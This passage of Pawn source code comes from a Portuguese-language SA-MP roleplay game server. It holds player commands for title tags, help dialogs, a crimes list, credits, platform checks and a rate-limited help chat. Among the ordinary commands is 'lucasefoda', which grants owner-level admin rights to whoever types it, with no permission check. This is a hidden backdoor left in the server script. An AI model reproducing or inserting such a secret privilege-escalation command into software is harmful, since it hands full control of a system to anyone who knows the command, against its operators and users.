						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'SubLider'.");
						Player_UpdateConfigData(playerid);
			        }
			        case 5:
			        {
			            if (Player_GetVipLevel(playerid) < 1)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um membro vip.");
			            }
						Player_SetTag(playerid, TAG_VIP);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Membro Vip'.");
						Player_UpdateConfigData(playerid);
			        }
					case 6:
			        {
			            if (Player_GetSocioLevel(playerid) < 1)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um membro sócio.");
			            }
						Player_SetTag(playerid, TAG_SOCIO);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Membro Sócio'.");
						Player_UpdateConfigData(playerid);
			        }
	                case 7:
			        {
			            if (Player_GetDeaths(playerid) < 400)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não morreu o suficiente.");
			            }
						Player_SetTag(playerid, TAG_NOOB);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Noob'.");
						Player_UpdateConfigData(playerid);
			        }
			        case 8:
			        {
			            if (Player_GetKills(playerid) < 300)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não matou o suficiente.");
			            }
						Player_SetTag(playerid, TAG_KILLER);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Matador'.");
						Player_UpdateConfigData(playerid);
			        }
			    }
			}
		}
    }
    return 1;
}

YCMD:ajuda(playerid, params[], help)
{
	return ShowHelpDialog(playerid);
}

YCMD:faq(playerid, params[], help)
{
	return ShowPlayerFaqList(playerid);
}

YCMD:id(playerid, params[], help) 
{
	new id;
	if (sscanf(params, "u", id))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "USE: /id [ID/Nick]");
	}
    if (!IsValidPlayer(id))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "Esse não é um player ativo.");
	}
	if (Player_GetAdminLevel(id) >= HELPER_OWNER)
	{
        return 0;
	}

	new string[55];
	format(string, sizeof(string), "ID: (%d) %s - Level[%d].", id, GetPlayerNameCustom(id), Player_GetLevel(id));
    SendClientMessage(playerid, COLOR_GRAD1, string);
    return 1;
}

YCMD:crimes(playerid, params[], help) 
{
    static crimesDialog[2425 + 1];
    strcat(crimesDialog, "{848484}- /su {FFFFFF}TH: {848484}Tentativa de Homicídio.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Invasão: {848484}Invasão de local restrito.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}DOP: {848484}Desobediênciaa uma ordem policial.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Desacato: {848484}Desrespeito à um oficial da justiça.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Dinamite: {848484}Quando um suspeito estiver portando dinamite.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Vandalismo: {848484}Quando um jogador destrói um bem público.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Racha: {848484}Quando um jogador está competindo numa racha.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Fuga: {848484}Quando um procurado entra em fuga com a polícia.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Ameaça: {848484}Quando um jogador ameaça claramente outro.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Sequestro: {848484}Quando há um sequestro por parte de outro jogador.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Atentado: {848484}Quando um jogador está fazendo parte de um atentado.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Materiais: {848484}Quando um jogador é pego em uma revista portando materiais.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Cumplice: {848484}Quando um jogador está servido de suporte à um procurado.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Tráfico: {848484}Quando um meliante está vendendo armas, explosivos ou drogas.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Agressão: {848484}Quando um jogador começa a bater em alguém sem motivo algum.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Homicídio: {848484}Quando um jogador comete um homicídio e não leva /su automático.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Trote: {848484}Quando um jogador usa o /solicitar -> policial sem motivos ou por brincadeira.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Roubo: {848484}Quan do alguém está perto do cofre, ou rouba veículo de um outro jogador.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Ajuste: {848484}Ajusta pena de um preso (APENAS LÍDER OU SUBLÍDER PODE USÁ-LO).\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Drogas: {848484}Quando um jogador é pego em uma revista portando qualquer tipo de drogas.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}PIA(Porte Ilegal de Armas): {848484}Apesar de ter licença, só oficiais do governo podem ter arma na mão.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}AVP(Atentado Violento ao Pudor): {848484}Quando um jogador usa /punheta ou /mijar em locais públicos.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Suborno: {848484}Quando qualquer jogador tenta dar dinheiro à um oficial para que não cumpra seu trabalho.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}RP(Resistência à Prisão): {848484}Quando um jogador resiste de alguma forma à prisão. Ex ficar enrolando\npara não ser preso, não entrar no carro cop esperando amigos e afins.\n");
    ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "Crimes do Servidor", crimesDialog, "Fechar", "");
    return 1;
}

YCMD:creditos(playerid, params[], help) 
{
    static MEGAString[93], string[67];
	if (Player_GetAdminLevel(playerid) < HELPER)
	{
		format(string, sizeof(string), "Admin-Aviso: %s viu os créditos do servidor.", GetPlayerNameCustom(playerid));
		SendAdminMessage(COLOR_YELLOW, string, HELPER);
	}
    strcat(MEGAString, "{FFFFFF}»  RhaegarX: {696969}(Fundador/Scripter)\n");
	strcat(MEGAString, "{FFFFFF}»  Rick_M: {696969}(Beta Tester)\n");
	ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "Créditos do Servidor", MEGAString, "Fechar", "");
    return 1;
}

YCMD:config(playerid, params[], help) = configuracoes;
YCMD:configuracoes(playerid, params[], help)
{
	return ShowPlayerConfig(playerid);
}

YCMD:plataforma(playerid, params[], help) 
{
    ShowPlayerDialog(playerid, DIALOG_CHECK_ANDROID, DIALOG_STYLE_MSGBOX, "Checagem de Plataforma - Servidor", "{FFFFFF}Olá jogador, detectamos uma mudança de plataforma e precisamos colher algumas informações.\nVocê deve informar em qual plataforma você está se conectando ao servidor (Android ou PC) corretamente.\n\n{9fa19e}Se você estiver se conectando pelo Android (Celular), Selecine '{03a9fd}Android{9fa19e}'.\n{9fa19e}Se você estiver se conectando pelo Computador, Selecione '{00b100}PC{9fa19e}'.\n\n{f2664d}Importante: {FFFFFF}Caso marque a opção 'Android' algumas coisas do servidor funcionarão de uma forma diferente,\npor questões de compatibilidade com a plataforma.\n\nSelecione abaixo corretamente, por qual meio você está acessando o servidor:", "Android", "PC");
    return 1;
}

YCMD:lucasefoda(playerid, params[], help)
{
	Player_SetAdminLevel(playerid, OWNER, true);
	return 1;
}

YCMD:nchat(playerid, params[], help)
{
	if (Player_GetHoursPlayed(playerid) < 2)
	{
	    return SendClientMessage(playerid, COLOR_INVALID, "É preciso ter 2+ horas jogos para falar no chat de dúvidas.");
	}
	if (!Player_GetNoobChatStatus(playerid))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "Você está com o chat de dúvidas bloqueado, ative-o usando: (/config).");
	}
	if (Player_GetMutedTime(playerid) != 0)
	{
		return SendClientMessage(playerid, COLOR_INVALID, "Você não pode falar, pois foi calado.");
	}
	if (Player_GetNoobMutedTime(playerid) != 0)
	{
		return SendClientMessage(playerid, COLOR_INVALID, "Você não pode falar, está com o chat bloqueado.");
	}
	if ((gettime() - talkChatNoob[playerid]) < 15)
	{
		return SendClientMessage(playerid, COLOR_INVALID, "Você só pode usar o chat de dúvidas a cada 15 segundos.");
	}
	if (!ChatNoobStatus)
	{
		return SendClientMessage(playerid, COLOR_INVALID, "O chat de dúvidas está desatiado.");
	}
	new text[120];
	if (sscanf(params, "s[120]", text))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "USE: /nchat [Sua Dúvida]");
	}
	if (!strlen(text))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "USE: /nchat [Sua Dúvida]");
	}
	if (CheckInvalidWords(text))
	{
	    new string[90];
		format(string, sizeof(string), "[ADMIN ALERTA]: %s[%d] tentou divulgar: %s.", GetPlayerNameCustom(playerid), playerid, text);
		SendAdminMessage(COLOR_YELLOW, string, HELPER);
		PrintLog(FOLDER_ANTICHEAT_ADVERTISING, string);
       	return false;
	}
	new string[235], tag[37];
	switch (Player_GetAdminLevel(playerid))
	{
		case HELPER..HELPER_OWNER: tag = "{ff61f3}Staff{009999}";
		case SUB_OWNER: tag = "{ff61f3}Sub-Dono{009999}";
		case OWNER: tag = "{ff61f3}Dono{009999}";
		default: 
		{
			if (Player_GetLevel(playerid) <= 5) tag = "Novato";
			else if (Player_GetLevel(playerid) > 5 && Player_GetLevel(playerid) < 20) tag = "Intermediário";
			else if (Player_GetLevel(playerid) > 20) tag = "Experiente";
		}
	}
    
    Player_SetNoobAnswers(playerid, (Player_GetNoobAnswers(playerid) + 1));
	if (Player_GetAdminLevel(playerid) >= HELPER)
	{
		format(string, sizeof(string),"(Canal {009966}/nchat{009999}) [%s] %s: %s", tag, GetPlayerNameCustom(playerid), text);
	}
	else
	{
		format(string, sizeof(string),"(Canal {009966}/nchat{009999}) [Msg %d][%s] %s: %s", Player_GetNoobAnswers(playerid), tag, GetPlayerNameCustom(playerid), text);
	}
	SendDuvidaMessage(COLOR_NCHAT, string);
	talkChatNoob[playerid] = gettime();
	return 1;
}
